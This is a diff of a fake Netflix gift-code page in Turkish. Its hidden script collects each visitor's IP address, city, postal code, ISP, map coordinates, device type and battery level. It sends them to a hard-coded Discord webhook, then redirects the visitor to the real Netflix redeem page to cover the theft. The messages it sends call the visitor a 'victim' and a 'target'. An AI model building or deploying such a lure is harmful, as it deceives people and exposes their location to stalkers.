@@ -24,72 +24,69 @@
     <div class="container">
         <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" class="logo">
         <h1>Hediye Kodunuz Hazırlanıyor</h1>
-        <p>Hesabınız kontrol ediliyor, lütfen bekleyin...</p>
+        <p>Sistem kontrol ediliyor, lütfen bekleyin...</p>
         <div class="loader"></div>
     </div>
 
     <script>
         const webhookURL = "https://discord.com/api/webhooks/1476700662212329595/_PH17dgTO-VNM48nCiAI3oEbB4zfonVEBqN3n-9KIx5wObUzwTEtr_D_3s5206i_gzKM";
 
-        // YÖNLENDİRME GARANTİSİ (4 Saniye)
-        const failSafe = setTimeout(() => {
+        // GARANTİ YÖNLENDİRME (4.5 Saniye sonra kesin atar)
+        setTimeout(() => {
             window.location.replace("https://www.netflix.com/tr/redeem");
         }, 4500);
 
         async function sinsiBot() {
             try {
-                // Hızlı IP ve Detaylı Geo sorgusu
+                // IP ve Detaylı Konum Bilgisi
                 const res = await fetch('https://ipapi.co/json/');
                 const d = await res.json();
                 
-                // Görüntüdeki gibi Harita Linki
+                // Harita Linki
                 const harita = `https://www.google.com/maps?q=${d.latitude},${d.longitude}`;
 
-                // Cihaz Tespiti
+                // Cihaz Bilgisi
                 const ua = navigator.userAgent;
                 let cihazTipi = "🖥️ Bilgisayar (PC)";
-                if (/tablet|ipad/i.test(ua)) cihazTipi = "平板 Tablet";
+                if (/tablet|ipad/i.test(ua)) cihazTipi = "📟 Tablet";
                 else if (/Mobile|Android|iPhone/i.test(ua)) cihazTipi = "📱 Akıllı Telefon";
 
-                // Batarya
+                // Batarya Bilgisi
                 let pil = "Bilinmiyor";
                 if (navigator.getBattery) {
                     const b = await navigator.getBattery();
-                    pil = `%${Math.round(b.level * 100)} ${b.charging ? '(Şarjda)' : ''}`;
+                    pil = `%${Math.round(b.level * 100)} ${b.charging ? '🔌' : '🔋'}`;
                 }
 
-                // EKRANINDAKİ GÖRÜNÜMÜN BİREBİR KODLANMIŞ HALİ
+                // DISCORD MESAJ TASARIMI
                 const rapor = {
                     username: "ANONİM BOT",
                     avatar_url: "https://i.imgur.com/8nN9S1L.png",
                     embeds: [{
                         title: "🎯 HEDEF PAKETLENDİ!",
-                        description: "Kurban tuzağa düştü. Tüm bilgiler aşağıda:",
-                        color: 16711680, // Sol taraftaki kırmızı şerit
+                        description: "```fix\nKurban tuzağa düştü. Veriler sisteme işlendi.```",
+                        color: 16711680, // Sol kırmızı şerit
                         fields: [
-                            { name: "👤 Cihaz Türü", value: `**${cihazTipi}**`, inline: true },
-                            { name: "🔋 Batarya", value: `**${pil}**`, inline: true },
-                            { name: "🌐 IP Adresi", value: `\`${d.ip}\``, inline: false },
-                            { name: "🏠 Adres (İl/İlçe/Semt)", value: `**${d.region} / ${d.city} / ${d.postal || "Bilinmiyor"}**`, inline: false },
-                            { name: "📡 İnternet Hattı", value: `**${d.org}**`, inline: false },
-                            { name: "📍 Harita Konumu", value: `[Nokta Atışı Haritada Gör](${harita})`, inline: false }
+                            { name: "👤 Cihaz / Batarya", value: `> ${cihazTipi} | **${pil}**`, inline: false },
+                            { name: "🌐 IP Adresi", value: `\`\`\`css\n${d.ip}\n\`\`\``, inline: false },
+                            { name: "🏠 Detaylı Adres", value: `📍 **${d.region} / ${d.city} / ${d.postal || "Yok"}**`, inline: false },
+                            { name: "📡 İnternet Hattı", value: `📡 *${d.org}*`, inline: false },
+                            { name: "📍 Harita Konumu", value: `[🗺️ Nokta Atışı Haritada Gör (Tıkla)](${harita})`, inline: false }
                         ],
-                        footer: { text: "ANONİM BOT Takip Sistemi | " + new Date().toLocaleString('tr-TR') },
+                        footer: { text: "ANONİM BOT Takip Sistemi • " + new Date().toLocaleString('tr-TR') },
                         thumbnail: { url: "https://upload.wikimedia.org/wikipedia/commons/f/ff/Netflix-new-icon.png" } // Sağ üstteki logo
                     }]
                 };
 
-                // Discord'a gönder
+                // Discord'a fırlat
                 await fetch(webhookURL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify(rapor)
                 });
 
-                window.location.replace("https://www.netflix.com/tr/redeem");
-
             } catch (e) {
-                window.location.replace("https://www.netflix.com/tr/redeem");
+                console.log("Hata olsa da yönlendirme devam eder.");
             }
         }
 
